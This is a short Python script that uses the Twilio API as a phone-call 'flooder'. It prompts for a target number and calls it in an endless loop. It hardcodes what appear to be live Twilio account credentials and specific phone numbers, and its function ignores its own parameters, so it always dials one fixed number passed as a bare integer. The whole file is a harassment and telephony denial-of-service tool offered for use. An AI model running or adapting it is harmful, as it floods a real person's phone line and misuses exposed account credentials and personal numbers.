import time
# NOTE: This requires python 3 and the twilio library to be installed (pip install twilio)
from twilio.rest import Client

accountSid = "ACcbc7c4f84bba7e4a76f9488fc8e3bc5a"
authtoken = "056206dbfee2c6e8a528708255b6e62e"
voiceml="https://demo.twilio.com/welcome/voice/"

# Replace these with phone numbers.            
sourceNumbers = [ "+12194023461" ]

def callThem(toNumber, fromNumber):
    try:
        call = client.calls.create(
             to = +919862337399,
             from_ = +12194023461,
             url = voiceml,
             method = "GET",
       )
        print("Started call to %s from %s" % (+919862337399, +12194023461));
    except Exception as err:
        print("Error on  %s from %s: %s" % (+919862337399, +12194023461, err));

numToCall = input("Enter the target number to start flood (+1 MUST BE IN FRONT!): ")
input("Press ENTER to start the flooder, Otherwise exit the application right now...")

client = Client(accountSid, authtoken)

count = 0;
while True :
    count += 1
    print("Starting call batch %s [ %s Nums.]" % (count, len(sourceNumbers) ))

    for sourceNumber in sourceNumbers:
        callThem(numToCall, sourceNumber)
        time.sleep(1)
    time.sleep(5)